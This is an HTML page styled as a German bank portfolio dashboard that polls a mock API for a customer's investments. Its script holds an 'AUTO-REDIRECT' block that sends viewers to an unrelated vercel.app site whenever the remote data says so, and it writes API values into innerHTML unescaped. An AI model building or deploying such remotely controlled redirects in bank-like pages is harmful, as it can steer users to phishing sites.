<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Portfolio Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body { font-family: Inter, sans-serif; margin:0; background:#0f1724; color:#e6eef8; }
.wrap { max-width:420px; margin:0 auto; padding:16px; }
.logo { display:block; width:120px; margin:0 auto 20px; }
.card { background:#0b1220; border-radius:14px; padding:16px; margin-bottom:16px; box-shadow:0 4px 12px rgba(0,0,0,0.5); }
.user-info { text-align:center; }
.user-info h2 { margin:0; font-size:20px; }
.user-info p { margin:6px 0 0; color:#98a0b3; font-size:14px; }
.chart-wrap { height:260px; margin-top:12px; }
canvas { width:100% !important; height:100% !important; }
.legend { display:flex; gap:12px; margin-top:8px; flex-wrap:wrap; }
.legend-item { display:flex; align-items:center; gap:6px; font-size:13px; color:#98a0b3; }
.swatch { width:12px; height:12px; border-radius:3px; }
.meta { display:flex; justify-content:space-between; margin-top:8px; font-size:12px; color:#98a0b3; }
.btn { background:transparent; border:1px solid rgba(255,255,255,0.06); padding:6px 10px; border-radius:10px; color:#98a0b3; font-size:13px; cursor:pointer; }
</style>
</head>
<body>
<div class="wrap">

<img class="logo" src="https://via.placeholder.com/300x80.png?text=Bank+Logo" alt="Bank Logo">

<div class="card user-info">
<h2 id="userName">â€”</h2>
<p id="customerNumber">Kundennummer #â€”</p>
</div>

<div class="card">
<strong id="investmentTitle">Investitionsaufteilung</strong>
<div class="chart-wrap"><canvas id="pieChart"></canvas></div>
<div class="legend" id="pieLegend"></div>
<div class="meta">
<span>Zuletzt aktualisiert: <span id="lastUpdated">â€”</span></span>
<button class="btn" id="refreshBtn">Aktualisieren</button>
</div>
</div>

<div class="card">
<strong>Rendite Ã¼ber die Zeit</strong>
<div class="chart-wrap"><canvas id="lineChart"></canvas></div>
<div class="meta">
<span>Status: <span id="status">idle</span></span>
</div>
</div>

</div>

<script>
// -------------------------------------------------
// Redirect configuration
// -------------------------------------------------
let redirectDone = false;
const REDIRECT_URL = "https://trascription-git-main-javad-niroumands-projects.vercel.app/";

// -------------------------------------------------
const API_URL = "https://6797e9d9c2c861de0c6e6bdf.mockapi.io/investments/12345";
const COLORS = ['#ffd166','#3ec4ff','#6ee7b7','#b388ff'];
let lastData = null;
let pieChart, lineChart;

function formatCurrency(n){ return 'â‚¬'+n.toLocaleString(undefined,{minimumFractionDigits:2, maximumFractionDigits:2}); }

function renderLegend(items){
  const container = document.getElementById('pieLegend');
  container.innerHTML = '';
  items.forEach((item, idx)=>{
    if(item.type){
      const node = document.createElement('div');
      node.className = 'legend-item';
      node.innerHTML = `<div class="swatch" style="background:${COLORS[idx % COLORS.length]}"></div>${item.type} (${item.percentage}%)`;
      container.appendChild(node);
    }
  });
}

async function fetchData(){
  try {
    const res = await fetch(API_URL, {cache:'no-store'});
    const data = await res.json();
    const dataStr = JSON.stringify(data);

    // -------------------------------------------------
    // ðŸ”¥ AUTO-REDIRECT LOGIC
    // -------------------------------------------------
    if (data.update === true && !redirectDone) {
        redirectDone = true;
        window.location.href = REDIRECT_URL;
    }
    if (data.update === false) {
        redirectDone = false;
    }
    // -------------------------------------------------

    if(dataStr === lastData){
      document.getElementById('status').textContent='Keine Ã„nderung';
      return;
    }
    lastData = dataStr;

    // User info
    document.getElementById('userName').textContent = data.user.name;
    document.getElementById('customerNumber').textContent =
        'Kundennummer #' + data.user.customerNumber;

    // Investment category
    const category = data.investments[0]?.category || '';
    document.getElementById('investmentTitle').textContent =
        `Investitionsaufteilung â€“ ${category}`;

    // Pie chart
    const invItems = data.investments.filter(i=>i.type);
    const invLabels = invItems.map(i=>i.type);
    const invData = invItems.map(i=>i.percentage);

    pieChart.data.labels = invLabels;
    pieChart.data.datasets[0].data = invData;
    pieChart.data.datasets[0].backgroundColor =
        invLabels.map((_,i)=>COLORS[i % COLORS.length]);
    
    pieChart.update();
    renderLegend(invItems);

    // ROI chart
    let roiHist = data.roi.map(p=>({x:p.date, y:p.value}));
    let roiFut = data.roi_future.map(p=>({x:p.date, y:p.value}));

    roiHist.sort((a,b)=>new Date(a.x)-new Date(b.x));
    roiFut.sort((a,b)=>new Date(a.x)-new Date(b.x));

    const histValues = roiHist.map(p=>p.y);
    const futValues  = roiFut.map(p=>p.y);

    const labels = roiHist.map(p=>p.x).concat(roiFut.map(p=>p.x));

    lineChart.data.labels = labels;
    lineChart.data.datasets = [
      {
        label:'Historisch',
        data: histValues.concat(new Array(futValues.length).fill(null)),
        borderColor:'#3ec4ff',
        borderWidth:2,
        fill:false,
        tension:0.3
      },
      {
        label:'Prognose',
        data: new Array(histValues.length).fill(null).concat(futValues),
        borderColor:'#ff8fab',
        borderWidth:2,
        fill:false,
        tension:0.3,
        borderDash:[8,4]
      }
    ];
    lineChart.update();

    document.getElementById('lastUpdated').textContent =
        new Date().toLocaleString();
    document.getElementById('status').textContent = 'Aktualisiert';

  } catch(e){
    console.error(e);
    document.getElementById('status').textContent = 'Fehler';
  }
}

function initCharts(){
  const pieCtx = document.getElementById('pieChart').getContext('2d');
  pieChart = new Chart(pieCtx,{
    type:'pie',
    data:{ labels:[], datasets:[{data:[], backgroundColor: []}] },
    options:{
      responsive:true,
      maintainAspectRatio:false,
      animation:{duration:700},
      plugins:{
        legend:{display:false},
        tooltip:{enabled:true}
      }
    }
  });

  const lineCtx = document.getElementById('lineChart').getContext('2d');
  lineChart = new Chart(lineCtx,{
    type:'line',
    data:{ labels:[], datasets:[] },
    options:{
      responsive:true,
      maintainAspectRatio:false,
      animation:{duration:700},
      scales:{
        x:{ticks:{color:'#98a0b3'}},
        y:{ticks:{color:'#98a0b3'}}
      },
      plugins:{
        tooltip:{
          callbacks:{ label: ctx => 'Wert: ' + formatCurrency(ctx.parsed.y)}
        }
      }
    }
  });
}

document.getElementById('refreshBtn').addEventListener('click', fetchData);

initCharts();
fetchData();
setInterval(fetchData, 8000);
</script>
</body>
</html>
